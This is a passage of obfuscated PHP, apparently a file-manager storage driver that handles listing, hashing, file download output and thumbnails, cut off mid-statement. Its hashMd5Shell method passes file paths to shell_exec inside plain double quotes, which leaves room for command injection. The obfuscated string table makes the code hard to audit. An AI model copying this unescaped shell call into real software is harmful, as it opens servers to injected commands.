(isset($«ÒÊÅ‘[$¯ÒÀ¯ä[79]])) { $®Æ¼…¡¤[$¯ÒÀ¯ä[79]] = $«ÒÊÅ‘[$¯ÒÀ¯ä[79]]; } if (isset($«ÒÊÅ‘[$¯ÒÀ¯ä[88]])) { $®Æ¼…¡¤[$¯ÒÀ¯ä[88]] = $«ÒÊÅ‘[$¯ÒÀ¯ä[88]]; } if (!$†²÷”ë‚) { $ôÎûËË¨[] = $®Æ¼…¡¤; continue; } $ôÎûËË¨[] = $®Æ¼…¡¤; $šùÉ»ä§ = $«ÒÊÅ‘[$¯ÒÀ¯ä[87]]; $ëé¥›î = $this->pathDriver; if (substr($«ÒÊÅ‘[$¯ÒÀ¯ä[87]], 0, strlen($ëé¥›î)) == $ëé¥›î) { $šùÉ»ä§ = substr($šùÉ»ä§, strlen($ëé¥›î)); } $this->listAllMake($šùÉ»ä§, $ôÎûËË¨); } } public function listAllSimple($©Â¹úÂ‰, $¤’Ş¢û¬ = false) { $Â’Ä´ = $this->listAll($©Â¹úÂ‰); return $this->listAllSimpleMake($Â’Ä´, $this->getPathOuter($©Â¹úÂ‰), $¤’Ş¢û¬); } public function listAllSimpleMake($ÆÑ÷÷ì´, $¿Ç’‘›ö, $îµ¥¼ê) { $üö×»áœ =& $_SERVER[¼’ç§¼´]; $ú½§ŸŸç = array(); $¿Ç’‘›ö = rtrim(get_path_father($¿Ç’‘›ö), $üö×»áœ[8]) . $üö×»áœ[8]; foreach ($ÆÑ÷÷ì´ as $²“²Í¤ö) { $’ıÓ’Í = array($üö×»áœ[87] => $²“²Í¤ö[$üö×»áœ[87]], $üö×»áœ[89] => $²“²Í¤ö[$üö×»áœ[87]], $üö×»áœ[78] => $²“²Í¤ö[$üö×»áœ[78]]); if (isset($²“²Í¤ö[$üö×»áœ[79]]) && !$²“²Í¤ö[$üö×»áœ[78]]) { $’ıÓ’Í[$üö×»áœ[79]] = $²“²Í¤ö[$üö×»áœ[79]]; } if (isset($²“²Í¤ö[$üö×»áœ[88]])) { $’ıÓ’Í[$üö×»áœ[88]] = $²“²Í¤ö[$üö×»áœ[88]]; } if (is_array($²“²Í¤ö[$üö×»áœ[90]])) { $’ıÓ’Í[$üö×»áœ[89]] = $²“²Í¤ö[$üö×»áœ[90]][$üö×»áœ[87]]; $’ıÓ’Í[$üö×»áœ[79]] = $²“²Í¤ö[$üö×»áœ[90]][$üö×»áœ[79]]; $’ıÓ’Í[$üö×»áœ[88]] = $²“²Í¤ö[$üö×»áœ[90]][$üö×»áœ[88]]; } else { if (substr($²“²Í¤ö[$üö×»áœ[87]], 0, strlen($¿Ç’‘›ö)) == $¿Ç’‘›ö) { $’ıÓ’Í[$üö×»áœ[87]] = substr($²“²Í¤ö[$üö×»áœ[87]], strlen($¿Ç’‘›ö)); } } $­ÈïİË = $²“²Í¤ö[$üö×»áœ[78]] ? $üö×»áœ[8] : $üö×»áœ[12]; $’ıÓ’Í[$üö×»áœ[89]] = rtrim($’ıÓ’Í[$üö×»áœ[89]], $üö×»áœ[8]) . $­ÈïİË; $’ıÓ’Í[$üö×»áœ[87]] = $üö×»áœ[8] . trim($’ıÓ’Í[$üö×»áœ[87]], $üö×»áœ[8]) . $­ÈïİË; if (!$îµ¥¼ê) { $ƒÈ€œ§ = explode($üö×»áœ[8], trim($’ıÓ’Í[$üö×»áœ[87]], $üö×»áœ[8])); $’ıÓ’Í[$üö×»áœ[87]] = $üö×»áœ[8] . implode($üö×»áœ[8], array_slice($ƒÈ€œ§, 1)) . $­ÈïİË; } $ú½§ŸŸç[] = $’ıÓ’Í; } return array_sort_by($ú½§ŸŸç, $üö×»áœ[87]); } public function upload($§Ş¯²¸, $ñ›¸™êõ, $†§Şâ… = false, $šœòÅ¼Å = REPEAT_REPLACE) { } public function uploadFileByID($ñÊó†­Ä, $ÕÈ“úˆ“, $³Æûø§») { } public function uploadFileByPath($óË«½£¬, $ß®•ü·Ø, $Ü–¹¾Û = array()) { } public function isUploadServer() { $ùÕ°„’ =& $_SERVER[¼’ç§¼´]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ùÕ°„’[91]) { return !0; } return $GLOBALS[$ùÕ°„’[6]][$ùÕ°„’[92]][$ùÕ°„’[93]]; } public function isFileOutServer() { $ñòç‰Ñ— =& $_SERVER[¼’ç§¼´]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ñòç‰Ñ—[91]) { return !0; } return $GLOBALS[$ñòç‰Ñ—[6]][$ñòç‰Ñ—[92]][$ñòç‰Ñ—[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($Ç¢ñ¼Åø) { $ôƒá =& $_SERVER[¼’ç§¼´]; if (!$this->isCdnHost()) { return $Ç¢ñ¼Åø; } return str_replace(trim(get_url_root($Ç¢ñ¼Åø), $ôƒá[8]), trim($this->cdnHost, $ôƒá[8]), $Ç¢ñ¼Åø); } public function uploadLink($÷ŸªäıÌ, $Æ€œ§ƒú = 0) { $¡Óíœ™× =& $_SERVER[¼’ç§¼´]; if ($this->isUploadServer()) { return; } $ÔÔ«ıœİ = $this->getType(); if (!in_array($ÔÔ«ıœİ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $¾î›Ú = 1024 * 1024 * 10; $˜Û’ÒµÂ = $Æ€œ§ƒú <= $¾î›Ú ? $¡Óíœ™×[95] : $¡Óíœ™×[96]; $Ç÷ÙÂÄ» = (!$Æ€œ§ƒú ? 1 : ceil($Æ€œ§ƒú / pow(1024, 3))) * 3600 * 4; $À­Ù©ùŞ = $this->{$˜Û’ÒµÂ}($÷ŸªäıÌ, $Ç÷ÙÂÄ»); if ($À­Ù©ùŞ) { $À­Ù©ùŞ[$¡Óíœ™×[97]] = $÷ŸªäıÌ; $À­Ù©ùŞ[$¡Óíœ™×[98]] = $ÔÔ«ıœİ; } return $À­Ù©ùŞ; } public function uploadFormData($İÏ›úû, $Ü›Ìãéş = 3600) { } public function uploadMultiData($¿óß€–ò, $Ğô›§½œ = 3600) { } public function multiUploadFormData($ë÷ß îÒ, $ĞíÇ®ç© = 3600) { return $this->uploadMultiData($ë÷ß îÒ, $ĞíÇ®ç©); } public function download($û€Ğµ×, $ÚÓ‚À»´) { } public function ext($şúğæıù) { $¶ğ¾—§ß =& $_SERVER[¼’ç§¼´]; if (strpos($şúğæıù, $¶ğ¾—§ß[8]) === -1) { $áşû‚ˆö = $şúğæıù; } else { $áşû‚ˆö = $this->pathThis($şúğæıù); } $ÕÒĞÒ¥ = $¶ğ¾—§ß[12]; if (strstr($áşû‚ˆö, $¶ğ¾—§ß[10])) { $ÕÒĞÒ¥ = substr($áşû‚ˆö, strrpos($áşû‚ˆö, $¶ğ¾—§ß[10]) + 1); $ÕÒĞÒ¥ = strtolower($ÕÒĞÒ¥); } if (strlen($ÕÒĞÒ¥) > 3 && preg_match($¶ğ¾—§ß[99], $ÕÒĞÒ¥, $Ñ ÷Ãã‰)) { $ÕÒĞÒ¥ = $¶ğ¾—§ß[12]; } return $ÕÒĞÒ¥; } public function pathThis($úÌç£À–) { $€¥ÌÒŞµ =& $_SERVER[¼’ç§¼´]; $úÌç£À– = str_replace($€¥ÌÒŞµ[100], $€¥ÌÒŞµ[8], rtrim($úÌç£À–, $€¥ÌÒŞµ[8])); $ûØ¶¹© = strrpos($úÌç£À–, $€¥ÌÒŞµ[8]); if ($ûØ¶¹© === !1) { return $úÌç£À–; } return substr($úÌç£À–, $ûØ¶¹© + 1); } public function pathFather($Ñ†œÄ¿®) { $ëŸüËã =& $_SERVER[¼’ç§¼´]; $Ñ†œÄ¿® = str_replace($ëŸüËã[100], $ëŸüËã[8], rtrim($Ñ†œÄ¿®, $ëŸüËã[8])); $ï†ğ¤µ¼ = strrpos($Ñ†œÄ¿®, $ëŸüËã[8]); if ($ï†ğ¤µ¼ === !1) { return $ëŸüËã[12]; } return substr($Ñ†œÄ¿®, 0, $ï†ğ¤µ¼ + 1); } public function hashSimple($…¿Šõ…) { $àÈŠı¡ =& $_SERVER[¼’ç§¼´]; if (!$…¿Šõ…) { return md5($àÈŠı¡[12]); } $—Ã­ÚÇÌ = $this->size($…¿Šõ…); $Š°Ÿ™Š» = 200; $¬àü±è¢ = 50; if ($—Ã­ÚÇÌ <= $Š°Ÿ™Š» * $¬àü±è¢) { return $this->hashMd5($…¿Šõ…) . $—Ã­ÚÇÌ; } $¹»¶‹ = intval($—Ã­ÚÇÌ / $¬àü±è¢); $¡¿–Ô¤Ì = $àÈŠı¡[12]; for ($ôôÊµã = 0; $ôôÊµã < $¬àü±è¢; $ôôÊµã++) { $¡¿–Ô¤Ì .= $this->fileSubstr($…¿Šõ…, $¹»¶‹ * $ôôÊµã, $Š°Ÿ™Š»); } $¡¿–Ô¤Ì .= $this->fileSubstr($…¿Šõ…, $—Ã­ÚÇÌ - $Š°Ÿ™Š», $Š°Ÿ™Š»); return md5($¡¿–Ô¤Ì) . $—Ã­ÚÇÌ; } public static $md5Cache = array(); public function hashMd5($ÊÔ·®ˆ°) { if (!$ÊÔ·®ˆ°) { return md5($_SERVER[¼’ç§¼´][12]); } $ÊÔ·®ˆ° = $this->iconvSystem($ÊÔ·®ˆ°); if (isset(self::$md5Cache[$ÊÔ·®ˆ°])) { return self::$md5Cache[$ÊÔ·®ˆ°]; } self::$md5Cache[$ÊÔ·®ˆ°] = $this->hashMd5Shell($ÊÔ·®ˆ°); if (!self::$md5Cache[$ÊÔ·®ˆ°]) { self::$md5Cache[$ÊÔ·®ˆ°] = @md5_file($ÊÔ·®ˆ°); } return self::$md5Cache[$ÊÔ·®ˆ°]; } private function hashMd5Shell($÷ˆÁÜşŞ) { $¸»´¾ÙŞ =& $_SERVER[¼’ç§¼´]; if (!$÷ˆÁÜşŞ) { return md5($¸»´¾ÙŞ[12]); } if (!function_exists($¸»´¾ÙŞ[101])) { return !1; } $Õ…¨“ŒÍ = array($¸»´¾ÙŞ[102], $¸»´¾ÙŞ[103]); $§ï¦§ı = Cache::get($¸»´¾ÙŞ[104]); if (!$§ï¦§ı) { $í±¶óø¹ = BASIC_PATH . $¸»´¾ÙŞ[105]; $›¸¸™àş = md5_file($í±¶óø¹); $§ï¦§ı = $¸»´¾ÙŞ[106]; foreach ($Õ…¨“ŒÍ as $¢ÙÊÃÑ±) { $ÍÛ÷É»¥ = shell_exec($¢ÙÊÃÑ± . "\x20\x22{$í±¶óø¹}\42"); if ($ÍÛ÷É»¥ && substr(trim($ÍÛ÷É»¥), 0, 32) == $›¸¸™àş) { $§ï¦§ı = $¢ÙÊÃÑ±; break; } } Cache::set($¸»´¾ÙŞ[104], $§ï¦§ı, 3600); } if ($§ï¦§ı == $¸»´¾ÙŞ[106]) { return !1; } $ÍÛ÷É»¥ = shell_exec($§ï¦§ı . "\40\42{$÷ˆÁÜşŞ}\x22"); $ÍÛ÷É»¥ = str_replace($¸»´¾ÙŞ[107], $¸»´¾ÙŞ[12], $ÍÛ÷É»¥); return substr($ÍÛ÷É»¥, 0, 32); } public function link($õÓ‰ßÇÖ) { return $õÓ‰ßÇÖ; } public function fileOut($Îã÷ªĞ¿, $ÖÀúâı = false, $×ğº‘†¶ = false, $Ü³û»şê = '') { $Æ›ë°Óø =& $_SERVER[¼’ç§¼´]; $this->cacheMethod(null, null); if (!$Îã÷ªĞ¿ || !$this->exist($Îã÷ªĞ¿)) { show_json(LNG($Æ›ë°Óø[108]), !1, $×ğº‘†¶); } $“Éßàœ = $this->getType() == $Æ›ë°Óø[109]; $¾£‘şïÇ = $GLOBALS[$Æ›ë°Óø[6]][$Æ›ë°Óø[92]][$Æ›ë°Óø[110]][$Æ›ë°Óø[111]]; $–ÌÍ„¶ = (double) $GLOBALS[$Æ›ë°Óø[6]][$Æ›ë°Óø[92]][$Æ›ë°Óø[110]][$Æ›ë°Óø[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $Öúñ¾Æ¬ = $this->infoFull($Îã÷ªĞ¿); $ôÏ¥úØœ = $Öúñ¾Æ¬[$Æ›ë°Óø[79]]; $óà ë”‹ = gmdate($Æ›ë°Óø[113], $Öúñ¾Æ¬[$Æ›ë°Óø[88]]); $ƒæ²ôîæ = $×ğº‘†¶ ? $×ğº‘†¶ : $this->iconvApp($Öúñ¾Æ¬[$Æ›ë°Óø[32]]); $ƒâ¼Úª¥ = 0; $»ó­èìÜ = $ôÏ¥úØœ - 1; $ıÆñÚÆ = $this->ext($ƒæ²ôîæ); if (in_array($ıÆñÚÆ, array($Æ›ë°Óø[114], $Æ›ë°Óø[115], $Æ›ë°Óø[116], $Æ›ë°Óø[117]))) { $ıÆñÚÆ = $Æ›ë°Óø[118]; } if (in_array($ıÆñÚÆ, array($Æ›ë°Óø[119]))) { $ıÆñÚÆ = $Æ›ë°Óø[120]; } if (!$Ü³û»şê) { $Ü³û»şê = md5($óà ë”‹ . $ôÏ¥úØœ); } $Ü³û»şê = $Æ›ë°Óø[121] . $Ü³û»şê . $Æ›ë°Óø[121]; $Í”Å·ÂÃ = get_file_mime($ıÆñÚÆ); $£á€ÇÜ¹ = !0; $£á€ÇÜ¹ = isset($_GET[$Æ›ë°Óø[122]]) ? !1 : !0; if ($ÖÀúâı === !1 && !mime_support($Í”Å·ÂÃ)) { $Í”Å·ÂÃ = $Æ›ë°Óø[123]; } header($Æ›ë°Óø[124]); header($Æ›ë°Óø[125] . $Í”Å·ÂÃ); $”ƒ™“î = rawurlencode($ƒæ²ôîæ); $”ƒ™“î = $Æ›ë°Óø[121] . $”ƒ™“î . $Æ›ë°Óø[126] . $”ƒ™“î; if ($ÖÀúâı) { header($Æ›ë°Óø[127]); header($Æ›ë°Óø[128] . $”ƒ™“î); } else { if ($£á€ÇÜ¹) { header($Æ›ë°Óø[129] . $”ƒ™“î); } } $Ä¿­óû = 3600 * 24 * 30; header($Æ›ë°Óø[130]); header($Æ›ë°Óø[131]); header($Æ›ë°Óø[132] . $Ä¿­óû); header($Æ›ë°Óø[133] . gmdate($Æ›ë°Óø[113], time() + $Ä¿­óû) . $Æ›ë°Óø[134]); if (isset($_SERVER[$Æ›ë°Óø[135]]) && strtotime($_SERVER[$Æ›ë°Óø[135]]) == $Öúñ¾Æ¬[$Æ›ë°Óø[88]]) { header($Æ›ë°Óø[136], !0, 304); die; } if (isset($_SERVER[$Æ›ë°Óø[137]]) && $_SERVER[$Æ›ë°Óø[137]] == $Ü³û»şê) { header($Æ›ë°Óø[138] . $Ü³û»şê, !0, 304); die; } header($Æ›ë°Óø[138] . $Ü³û»şê); header($Æ›ë°Óø[139] . $óà ë”‹ . $Æ›ë°Óø[134]); header($Æ›ë°Óø[140] . $ƒæ²ôîæ); header($Æ›ë°Óø[141]); header($Æ›ë°Óø[142] . $ôÏ¥úØœ); header($Æ›ë°Óø[143]); Hook::trigger($Æ›ë°Óø[144], $Îã÷ªĞ¿, $ôÏ¥úØœ, $ƒæ²ôîæ, $ıÆñÚÆ); if (!$ÖÀúâı && $ıÆñÚÆ == $Æ›ë°Óø[145]) { if ($ôÏ¥úØœ > 1024 * 1024 * 5) { die; } $’üöçÔ = $this->getContent($Îã÷ªĞ¿); $’üöçÔ = Html::clearSVG($’üöçÔ); header($Æ›ë°Óø[146] . strlen($’üöçÔ)); echo $’üöçÔ; die; } $šĞÖÜé© = strtolower($_SERVER[$Æ›ë°Óø[147]]); if ($“Éßàœ && $šĞÖÜé© && $¾£‘şïÇ) { if (strstr($šĞÖÜé©, $Æ›ë°Óø[148])) { header($Æ›ë°Óø[149] . $Îã÷ªĞ¿); } else { if (strstr($šĞÖÜé©, $Æ›ë°Óø[150])) { header($Æ›ë°Óø[151] . $Îã÷ªĞ¿); } else { if (strstr($šĞÖÜé©, $Æ›ë°Óø[152])) { header($Æ›ë°Óø[153] . $Îã÷ªĞ¿); } } } if ($–ÌÍ„¶) { header($Æ›ë°Óø[154] . $–ÌÍ„¶); } return; } if (isset($_SERVER[$Æ›ë°Óø[155]])) { if (preg_match($Æ›ë°Óø[156], $_SERVER[$Æ›ë°Óø[155]], $¤ªÅŒ…)) { $ƒâ¼Úª¥ = intval($¤ªÅŒ…[1]); $ƒâ¼Úª¥ = $ƒâ¼Úª¥ <= 0 ? 0 : ($ƒâ¼Úª¥ >= $»ó­èìÜ ? $»ó­èìÜ : $ƒâ¼Úª¥); if (!empty($¤ªÅŒ…[2])) { $­å€À±¾ = intval($¤ªÅŒ…[2]); $»ó­èìÜ = $­å€À±¾ < $ƒâ¼Úª¥ ? $ƒâ¼Úª¥ : ($­å€À±¾ >= $»ó­èìÜ ? $»ó­èìÜ : $­å€À±¾); } } header($Æ›ë°Óø[157]); header("\103\157\156\x74\145\x6e\x74\x2d\x52\x61\x6e\147\145\x3a\40\x62\171\164\145\x73\40{$ƒâ¼Úª¥}\55{$»ó­èìÜ}\57" . $ôÏ¥úØœ); } else { header($Æ›ë°Óø[158]); } header($Æ›ë°Óø[159]); header($Æ›ë°Óø[160]); $¥Ä²âé = !0; if ($_SERVER[$Æ›ë°Óø[161]] == $Æ›ë°Óø[162] && $ôÏ¥úØœ > 1204 * 1024 * 1024 * 2) { $¥Ä²âé = !1; } if ($¥Ä²âé) { header($Æ›ë°Óø[163] . ($»ó­èìÜ - $ƒâ¼Úª¥ + 1)); } if ($_SERVER[$Æ›ë°Óø[164]] == $Æ›ë°Óø[165]) { return; } $ıáËšçï = array($Æ›ë°Óø[166] => !1, $Æ›ë°Óø[167] => $ƒâ¼Úª¥, $Æ›ë°Óø[168] => $»ó­èìÜ, $Æ›ë°Óø[169] => $ıÆñÚÆ, $Æ›ë°Óø[170] => $Öúñ¾Æ¬, $Æ›ë°Óø[171] => $Æ›ë°Óø[12], $Æ›ë°Óø[172] => 0); $ıáËšçï = Hook::filter($Æ›ë°Óø[173], $ıáËšçï); $ÕÅƒöúÔ = 1024 * 300; $ù«Ã–’ = 0; if ($–ÌÍ„¶) { $ù«Ã–’ = intval(1000 * 1000 * ($ÕÅƒöúÔ / $–ÌÍ„¶)); } while ($ƒâ¼Úª¥ <= $»ó­èìÜ) { $ı”©ö£Ñ = timeFloat(); check_abort(); $ÜËßî…ä = $»ó­èìÜ - $ƒâ¼Úª¥ + 1; if ($ÜËßî…ä <= $ÕÅƒöúÔ) { $ÕÅƒöúÔ = $ÜËßî…ä; } $’üöçÔ = $this->fileSubstr($Îã÷ªĞ¿, $ƒâ¼Úª¥, $ÕÅƒöúÔ); if ($ıáËšçï[$Æ›ë°Óø[166]]) { $ıáËšçï[$Æ›ë°Óø[171]] = $’üöçÔ; $ıáËšçï[$Æ›ë°Óø[172]] = $ƒâ¼Úª¥; $ıáËšçï = Hook::filter($Æ›ë°Óø[174], $ıáËšçï); $’üöçÔ = $ıáËšçï[$Æ›ë°Óø[171]]; } echo $’üöçÔ; $ƒâ¼Úª¥ += $ÕÅƒöúÔ; if ($ÕÅƒöúÔ == $ÜËßî…ä) { $ƒâ¼Úª¥ = $»ó­èìÜ + 1; } if ($ù«Ã–’) { $©¬ú‚­µ = intval(1000 * 1000 * (timeFloat() - $ı”©ö£Ñ)); $’±©óÙ = $ù«Ã–’ - $©¬ú‚­µ; if ($’±©óÙ > 5) { usleep($’±©óÙ); } } } } public function fileOutServer($Şõˆ›¦, $‡éığ = false, $®¼çË– = false, $§¼µÖ¶ê = '') { $this->fileOut($Şõˆ›¦, $‡éığ, $®¼çË–, $§¼µÖ¶ê); } public function fileOutLink($èœø—“µ) { header($_SERVER[¼’ç§¼´][175] . $èœø—“µ); die; } public function cacheMethod($¦Ø´Û”€, $ÆÁÜşÜ, $üš“¦¿ˆ = null) { $¯ã¿ÙÒ¢ =& $_SERVER[¼’ç§¼´]; static $Æ¤¬®‡Ä = array(); $‰şÌæÙ• = $ÆÁÜşÜ ? ltrim($this->getPathOuter($ÆÁÜşÜ), $¯ã¿ÙÒ¢[8]) : $¯ã¿ÙÒ¢[12]; $åÁ„­Ô¬ = $¯ã¿ÙÒ¢[176] . $¦Ø´Û”€ . $¯ã¿ÙÒ¢[177] . rtrim($‰şÌæÙ•, $¯ã¿ÙÒ¢[8]); if (is_null($¦Ø´Û”€)) { $Æ¤¬®‡Ä = array(); return; } if (is_null($ÆÁÜşÜ)) { foreach ($Æ¤¬®‡Ä as $åÁ„­Ô¬ => $¿…Å¦Ó) { if (!strstr($åÁ„­Ô¬, $¯ã¿ÙÒ¢[176] . $¦Ø´Û”€ . $¯ã¿ÙÒ¢[178])) { continue; } unset($Æ¤¬®‡Ä[$åÁ„­Ô¬]); } return; } if (!is_null($üš“¦¿ˆ)) { $Æ¤¬®‡Ä[$åÁ„­Ô¬] = $üš“¦¿ˆ; return; } $·ù¯è = isset($Æ¤¬®‡Ä[$åÁ„­Ô¬]) ? $Æ¤¬®‡Ä[$åÁ„­Ô¬] : null; if (!is_null($·ù¯è)) { return $·ù¯è; } $·ù¯è = $this->{$¦Ø´Û”€}($ÆÁÜşÜ); $Æ¤¬®‡Ä[$åÁ„­Ô¬] = $·ù¯è; return $·ù¯è; } public function cacheMethodInfoSet($÷˜Á“ÔÔ, $Ÿ¾­í©, $ô‰Ô¢Ìï = false) { $Óş›şÄœ =& $_SERVER[¼’ç§¼´]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($Óş›şÄœ[179], $÷˜Á“ÔÔ, $Ÿ¾­í©); $this->cacheMethod($Óş›şÄœ[180], $÷˜Á“ÔÔ, $Ÿ¾­í© ? !1 : !0); if (is_array($ô‰Ô¢Ìï)) { $this->cacheMethod($Óş›şÄœ[181], $÷˜Á“ÔÔ, $ô‰Ô¢Ìï); } } public function fileOutImage($å‰¨¦ğã, $’ÌÔûî = 250) { $Íù±Ğè =& $_SERVER[¼’ç§¼´]; set_timeout(); if (substr($å‰¨¦ğã, 0, 4) == $Íù±Ğè[152]) { $this->fileOutLink($å‰¨¦ğã); } $ç ÊùëŒ = $this->info($å‰¨¦ğã); $ª™µ˜»¤ = !1; $ç¼çÊ† = isset($GLOBALS[$Íù±Ğè[182]]) ? $GLOBALS[$Íù±Ğè[182]] : array(); if ($ç¼çÊ† && $ç¼çÊ†[$Íù±Ğè[183]] == $ç ÊùëŒ[$Íù±Ğè[87]]) { $ç ÊùëŒ = $ç¼çÊ†; $ü§àÈ° = $ç ÊùëŒ[$Íù±Ğè[184]]; if ($ü§àÈ° && isset($ü§àÈ°[$Íù±Ğè[185]])) { if ($ü§àÈ°[$Íù±Ğè[185]] <= $’ÌÔûî && $ü§àÈ°[$Íù±Ğè[186]] <= $’ÌÔûî) { $ª™µ˜»¤ = !0; } } } if ($ç ÊùëŒ[$Íù±Ğè[79]] <= 1024 * 50 || $ª™µ˜»¤ || !function_exists($Íù±Ğè[187]) || $ç ÊùëŒ[$Íù±Ğè[169]] == $Íù±Ğè[188]) { return $this->fileOut($å‰¨¦ğã, !1, $ç ÊùëŒ[$Íù±Ğè[32]]); } $™ğˆÚ÷Ä = kodIO::hashPath($ç ÊùëŒ); $œŸ–ç¦± = "\x63\x6f\166\x65\162\137{$™ğˆÚ÷Ä}\137{$’ÌÔûî}\x2e\160\x6e\147"; $¶±‘Ğáé = IO_PATH_SYSTEM_TEMP . $Íù±Ğè[189]; $ÄØşÚÙË = IO::infoFullSimple($¶±‘Ğáé); $šÃ¨–“Ç = $ÄØşÚÙË && is_array($ÄØşÚÙË) ? $ÄØşÚÙË[$Íù±Ğè[87]] : $Íù±Ğè[12]; if (!$šÃ¨–“Ç) { $šÃ¨–“Ç = IO::mkdir($¶±‘Ğáé); } if ($ç ÊùëŒ[$Íù±Ğè[190]] == $Íù±Ğè[191] && isset($ç ÊùëŒ[$Íù±Ğè[192]]) && $ç ÊùëŒ[$Íù±Ğè[192]] == kodIO::sourceID($šÃ¨–“Ç)) { $³öŸÁù¨ = $ç ÊùëŒ[$Íù±Ğè[193]]; if ($’ÌÔûî <= 500) { $Ş¬âì¦ = preg_replace($Íù±Ğè[194], $Íù±Ğè[195], $ç ÊùëŒ[$Íù±Ğè[32]]); $³öŸÁù¨ = IO::fileNameExist($šÃ¨–“Ç, $Ş¬âì¦); } return IO::fileOut(KodIO::make($³öŸÁù¨), !1, $ç ÊùëŒ[$Íù±Ğè[32]]); } $«šİ¹– = IO::fileNameExist($šÃ¨–“Ç, $œŸ–ç¦±); if ($«šİ¹–) { return IO::fileOut(KodIO::make($«šİ¹–), !1, $ç ÊùëŒ[$Íù±Ğè[32]]); } if ($’ÌÔûî > 1000) { $this->makeImageCover($šÃ¨–“Ç, $å‰¨¦ğã, $œŸ–ç¦±, $’ÌÔûî); $this->makeImageCover($šÃ¨–“Ç, $å‰¨¦ğã, "\143\x6f\x76\x65\162\137{$™ğˆÚ÷Ä}\137\x32\65\x30\x2e\x70\156\147", 250); $«šİ¹– = IO::fileNameExist($šÃ¨–“Ç, $œŸ–ç¦±); if ($«šİ¹–) { return IO::fileOut(KodIO::make($«šİ¹–), !1, $ç ÊùëŒ[$Íù±Ğè[32]]); } die; } if (!kodIO::allowCover($ç ÊùëŒ)) { return $this->fileOut($å‰¨¦ğã, !1, $ç ÊùëŒ[$Íù±Ğè[32]]); } $»àĞ‡Îà = Cache::get($œŸ–ç¦±); if ($»àĞ‡Îà == $Íù±Ğè[196] || $»àĞ‡Îà == $Íù±Ğè[197]) { echo $»àĞ‡Îà; die; } Cache::set($œŸ–ç¦±, $Íù±Ğè[197], 60); $×Ç¬ĞëÌ = array($šÃ¨–“Ç, $ç ÊùëŒ[$Íù±Ğè[87]], $œŸ–ç¦±, $’ÌÔûî); $²Á«“ä§ = $Íù±Ğè[198] . $ç ÊùëŒ[$Íù±Ğè[79]] . $Íù±Ğè[199] . $œŸ–ç¦± . $Íù±Ğè[200] . $ç ÊùëŒ[$Íù±Ğè[32]] . $Íù±Ğè[201] . $ç ÊùëŒ[$Íù±Ğè[87]]; TaskQueue::add($Íù±Ğè[202], $×Ç¬ĞëÌ, $²Á«“ä§, $œŸ–ç¦±); } public function makeImageCover($«ì¼™ƒˆ, $Ï÷âü§Ö, $¦‚¾•à, $°¶ö§òá) { $¨ò÷à¾ =& $_SERVER[¼’ç§¼´]; if (IO::fileNameExist($«ì¼™ƒˆ, $¦‚¾•à)) { return $¨ò÷à¾[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $éäÀğÀ = DATA_THUMB . $¦‚¾•à; del_file($éäÀğÀ); $Ÿ°íúÕÅ = IO::copy($Ï÷âü§Ö, TEMP_FILES, !1, $¦‚¾•à); if (!@file_exists($Ÿ°íúÕÅ)) { return $¨ò÷à¾[204]; } ImageThumb::createThumb($Ÿ°íúÕÅ, $éäÀğÀ, $°¶ö§òá, $°¶ö§òá * 10); if (@file_exists($éäÀğÀ)) { Cache::remove($¦‚¾•à); return IO::move($éäÀğÀ, $«ì¼™ƒˆ); } Cache::set($¦‚¾•à, $¨ò÷à¾[196], 600); del_file($éäÀğÀ); return $¨ò÷à¾[205] . $Ÿ°íúÕÅ . $¨ò÷à¾[74]; } public function fileOutImageServer($¤‚™µ£, $ã¨Ô¯‡˜ = 250) { $this->fileOutImage($¤‚™µ£, $ã¨Ô¯‡˜); } public function fileNameAuto($ÌàúÊĞË, $¿”ÎêÌ, $€Ğ›şŞˆ = REPEAT_RENAME, $ÒŸ³çë· = false) { $É½…ĞÕß =& $_SERVER[¼’ç§¼´]; $“ë²é§¦ = $ÌàúÊĞË === $É½…ĞÕß[12] ? $¿”ÎêÌ : rtrim($ÌàúÊĞË, $É½…ĞÕß[8]) . $É½…ĞÕß[8] . $¿”ÎêÌ; if ($€Ğ›şŞˆ == REPEAT_REPLACE || !$this->exist($“ë²é§¦) || $ÒŸ³çë· && $€Ğ›şŞˆ != REPEAT_RENAME_FOLDER) { return $¿”ÎêÌ; } if ($€Ğ›şŞˆ == REPEAT_SKIP) { return !1; } $·ö•‚‚ = $É½…ĞÕß[10] . get_path_ext($¿”ÎêÌ); $·ö•‚‚ = $·ö•‚‚ == $É½…ĞÕß[10] || $ÒŸ³çë· ? $É½…ĞÕß[12] : $·ö•‚‚; $ëéÑ®ø = 1; $¶‘”éü° = substr($¿”ÎêÌ, 0, strlen($¿”ÎêÌ) - strlen($·ö•‚‚)); $ß´ï²Ñ = $¶‘”éü° . "\x28{$ëéÑ®ø}\51{$·ö•‚‚}"; while ($this->exist(rtrim($ÌàúÊĞË, $É½…ĞÕß[8]) . $É½…ĞÕß[8] . $ß´ï²Ñ)) { $ß´ï²Ñ = $¶‘”éü° . "\x28{$ëéÑ®ø}\x29{$·ö•‚‚}"; $ëéÑ®ø++; } return $ß´ï²Ñ; } private function fileNameAutoList($·üÔçĞû, $”éõˆœÀ, $êæãÁî¤ = false) { $¢­şğûÙ =& $_SERVER[¼’ç§¼´]; $Üãöü× = $this->listPath($·üÔçĞû, !0); $Üãöü× = array_merge($Üãöü×[$¢­şğûÙ[85]], $Üãöü×[$¢­şğûÙ[86]]); $áòšË‚ë = array_to_keyvalue($Üãöü×, $¢­şğûÙ[12], $¢­şğûÙ[32]); $øá´¤ßÃ = $¢­şğûÙ[10] . get_path_ext($”éõˆœÀ); $øá´¤ßÃ = $øá´¤ßÃ == $¢­şğûÙ[10] || $êæãÁî¤ ? $¢­şğûÙ[12] : $øá´¤ßÃ; $É×šË” = substr($”éõˆœÀ, 0, strlen($”éõˆœÀ) - strlen($øá´¤ßÃ)); $ñ–úğøí = $É×šË” . "\50\x30\x29{$øá´¤ßÃ}"; for ($­ÎÉè³ = 1; $­ÎÉè³ <= count($áòšË‚ë) + 1; $­ÎÉè³++) { $ñ–úğøí = $É×šË” . 